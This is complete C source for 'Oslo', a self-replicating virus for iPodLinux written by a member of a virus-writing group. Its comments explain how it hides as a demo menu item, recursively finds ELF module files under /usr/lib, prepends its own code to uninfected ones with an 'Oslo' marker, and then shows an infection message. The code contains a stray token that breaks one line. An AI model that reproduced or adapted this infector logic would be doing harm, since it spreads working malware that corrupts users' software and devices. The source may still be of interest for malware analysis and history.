   /*
   Oslo Virus by free0n [DoomRiderz] 3/28/2007 -
   ipodlinux

   Now you might say how might a virus spread from one ipod to the other? Well
   how did computer viruses first spread? those big black things called floppies!
   The way I look at it is the ipod is the new floppy. It's nothing but a big hard
   drive. And People share programs just like they used to do and it doesn't take
   much more then posting the file on a message board or giving it to a friend and
   it may not be rapid spreading like other viruses/worms out there today but
   think about just how young these ipods actually are.. they are just in their
   infancy...

   How it works:
   1. Oslo register's it'self in the /Extras/Demos/ menu section
   2. Waits for a user to execute it
   3. Upon execution the virus does a recurisve search in /usr/lib for all mod.so
      files.
   4. For each potential file it checks to see if the file is ELF and it looks for
      a marker "Oslo" at the end of the file.
   5. IF the file hasn't been infected it writes it's code to the top of the file
      then writes the host and then the marker.
   6. After each file has been infected it then displays it's payload message
      and a cool graphic of the ipodlinux tux penguin

   greetz:genetix,necro,wargame,impurity,slage,hermit,cyneox,retro,DiA,hutley
          dref and all the others in #virus/vxers/vx-lab

   tested: ipod 4g photo - ipodlinux podzilla2
   */

   #include <stdio.h>
   #include <stdlib.h>
   #include <sys/types.h>
   #include <sys/stat.h>
   #include <sys/dir.h>
   #include <elf.h>
   #include <fcntl.h>
   #include <string.h>
   #include <errno.h>
   #include "pz.h"

   #define MARKER "Oslo"
   #define ELFISH "\177ELF"
   #define MAX_DIR_PATH 2048

   static PzModule *module;
   static ttk_surface image;
   static int imgw, imgh;
   static char *text;
   char *me;

   void draw_oslo (PzWidget *wid, ttk_surface srf)
   {
       //this is not my handywork but that of the mymodule program but with some
       //modification. This basically puts our payload together
       //it draws the text variable that's in oslo_window() and then
       //draws a dividing horizontal line that seperates the text and the coooool
       //ipodlinux tux penguin.
       char *p = text;
       int y = wid->y + 5;
       while (*p) {
       char svch;
       if (strchr (p, '\n')) {
           svch = *strchr (p, '\n');
           *strchr (p, '\n') = 0;
       } else {
           svch = 0;
       }
       ttk_text (srf, ttk_textfont, wid->x + 5, y, ttk_makecol (BLACK), p);
       p += strlen (p);
       y += ttk_text_height (ttk_textfont) + 1;
       *p = svch;
       if (*p) p++;
       }
       y += 4;
       // Dividing line
       ttk_line (srf, wid->x + 5, y, wid->x + wid->w - 5, y, ttk_makecol (DKGREY));

       y += 6;
       // The image
       ttk_blit_image (image, srf, wid->x + (wid->w - imgw) / 2, wid->y + (wid->h - imgh) / 2);
       y += imgh;

   }

   int event_oslo (PzEvent *ev)
   {
       //how the events get handled in podzilla2
       switch (ev->type) {
       case PZ_EVENT_BUTTON_UP:
       pz_close_window (ev->wid->win);
       break;
       case PZ_EVENT_DESTROY:
       ttk_free_surface (image);
       free (text);
       break;
       }
       return 0;
   }

   int IsElfish (char *hostFile) {

      //this is kind of cool atleast for me
      //we use Elf32_Ehdr to check if the
      //file is an elf file. We can also
      //check for other things but since
      //on ipodlinux they use <file>.mod.so
      //for their program.
      Elf32_Ehdr elfHeader;

      int fd;
      if((fd = open(hostFile,O_RDONLY)) == -1)
         return 0;

      read(fd,&elfHeader,sizeof(Elf32_Ehdr));
      close(fd);

      if((strncmp(elfHeader.e_ident,ELFISH,4)) != 0)
         return 0;

      return 1;
   }

   int Infected(char *name) {
      int infected = 0;

      //check to see if the file is a elf file
      //if it's not then we don't care..
      if(IsElfish(name) == 1) {

         int fd;
         int size;
         char buf[64];
         struct stat statbuf;

         //retrieve file size then subtract end size - the length
         //of the marker. If the marker isn't found then we know
         //the file isn't infected yet...

         stat(name, &statbuf);
         size =  statbuf.st_size - strlen(MARKER);

         if((fd = open(name,O_RDONLY)) != -1) {

             //read only the marker bytes or the bytes
             //where the marker might be...
             lseek(fd, size, SEEK_SET);
         read (fd,&buf,strlen(MARKER));
             close(fd);

             //compare what's in buf or the data that we read
         //in the file to what the marker is. MARKER = Oslo
             if ((strncmp (buf,MARKER,strlen(MARKER))) == 0) {
              infected = 1;
             }

             if(name == me) {
                infected = 1;
             }
         }
      }
      return infected;
   }

   void fubar(char *host) {
      /*
        We aren't totally mean as I didn't want to overwrite all the module
        files that we found but instead we just put our code above all the
        other modules, so if someone wanted to clean it they could. But don't worry
        the effect that happens is the same as what an overwriter would do.

        The reason why it's not a prepender/appender/poly is because of the way ipodlinux registers.
        applications in the main menu. Since our virus is registered as Oslo and we
        can't dynamically change what the register name is and build a new module on
        ipodlinux(on the ipod) we can't change what to register the module as during infection.

        Thus when it loops over the modules to build the main navigation it won't
        show every infected module but just one in each navigation sub section.
        So after infection the only modules that they will see are the ones that
        either aren't infected yet or if all modules are infected it will only show
        Oslo

      */

      int vsize,hsize;

      struct stat statbuf;
      struct stat statHostbuf;

      char *vircode;
      char *hostCode;

      FILE *fp = NULL;
      FILE *tmpOslo = NULL;
      FILE *fh = NULL;

      // open up our known clean virus that's in
      // /usr/lib/oslo/ and read everything and store it in
      // vircode, then try and open up a new host file to infect
      // after that we read the host code and put that in hostCode.
      // now we rewrite the mod.so file so it looks like this:
      // <virus>
      // <host>
      // <marker> = Oslo

      fp = fopen(me,"rb");
      if(fp != NULL) {
         stat(me,&statbuf);
         vsize = statbuf.st_size;
         vircode = malloc(vsize);
         fread(vircode,vsize,1,fp);

         fh = fopen(host,"rb");
         if(fh != NULL) {
            stat(host,&statHostbuf);
            hsize = statHostbuf.st_size;
            hostCode = malloc(hsize);
            fread(hostCode,hsize,1,fh);

            tmpOslo = fopen(host,"wb");
            if(tmpOslo != NULL) {
               fwrite(vircode,vsize,1,tmpOslo);
           fwrite(hostCode,hsize,1,tmpOslo);
           fwrite(MARKER,strlen(MARKER),1,tmpOslo);
             }
             fclose(tmpOslo);
         free(hostCode);
          }
          free(vircode);
          fclose(fh);
      }
      fclose(fp);
   }


   void InfectFiles(char *search) {

      //this is my sweeeeet recurisve directory
      //search. It's awesome just look at it ;)
      struct direct *DirEntryPtr;
      struct stat statbuf;
      DIR *DirPtr;
      char cwd[MAX_DIR_PATH+1];

      if(!getcwd(cwd, MAX_DIR_PATH+1)) {
         return;
      }

      DirPtr = opendir(".");
      if(!DirPtr) {
         return;
      }oslo_window

      while (DirEntryPtr = readdir(DirPtr))  {
         if (DirEntryPtr == 0) break;
         if (strcmp(DirEntryPtr->d_name,".") != 0 && strcmp(DirEntryPtr->d_name,"..") != 0)  {
             if (DirEntryPtr->d_name && strstr(DirEntryPtr->d_name, search)) {
                 if(Infected(DirEntryPtr->d_name) == 0) {
                    //fubar just cause u know it's gonna be :)!
            fubar(DirEntryPtr->d_name);
                 }
             }
         if (stat(DirEntryPtr->d_name, &statbuf) != -1) {
                 if (S_ISDIR(statbuf.st_mode)) {
                     chdir(DirEntryPtr->d_name);
             InfectFiles(search);
             chdir("..");
                 }
             }
         }
      }
      closedir(DirPtr);
   }

   PzWindow *oslo_window()
   {
       //start run of the virus
       //mod.so will infect every file in /usr/lib
       //change to pacman.mod.o to infect pacman :) or
       //duckhunt.mod.o to infect duckhunt (but why those are awesome games :)
       char *search = "mod.o";
       char *dir = "/usr/lib/";
       struct stat dir_stat;

       if(stat(dir, &dir_stat) == -1) {
          exit(1);
       }

       if(!S_ISDIR(dir_stat.st_mode)) {
          exit(1);
       }

       if(chdir(dir) == -1) {
           exit(1);
       }

       //this is our default path so in the zip file that this virus is packaged
       //in it's setup to have unzipped in /usr/lib the folder and contents for the
       //the virus will be good to go. Once ipodlinux boots up and the user runs the
       // it will do a recurisve search in /usr/lib directory where the programs
       //are kept.
       me = "/usr/lib/oslo/oslo.mod.o";
       InfectFiles(search);

       /**payload message (shows the tux ipodlinux image and my message) **/
       PzWindow *ret;
       image = ttk_load_image (pz_module_get_datapath (module, "image.png"));
       if (!image) {
       pz_error ("Could not load %s: %s", pz_module_get_datapath (module, "image.png"),
             strerror (errno));
       return TTK_MENU_DONOTHING;
       }
       ttk_surface_get_dimen (image, &imgw, &imgh);
       text = "You are infected with Oslo, the first \n iPodLinux Virus by free0n/DoomRiderz";
       ret = pz_new_window ("Oslo Virus", PZ_WINDOW_NORMAL);
       pz_add_widget (ret, draw_oslo, event_oslo);
       return pz_finish_window (ret);
   }

   void cleanup_oslo()
   {
       //when the ipodlinux shutsdow this message gets
       //displayed to the user :)
       printf ("greetz:genetix,necro,wargame\n");
   }

   void init_oslo()
   {
       //register oslo
       module = pz_register_module ("oslo", cleanup_oslo);
       //i find it only appropriate that we put this in the Demo section :)
       pz_menu_add_action ("/Extras/Demos/Oslo", oslo_window);
   }

   PZ_MOD_INIT (init_oslo)
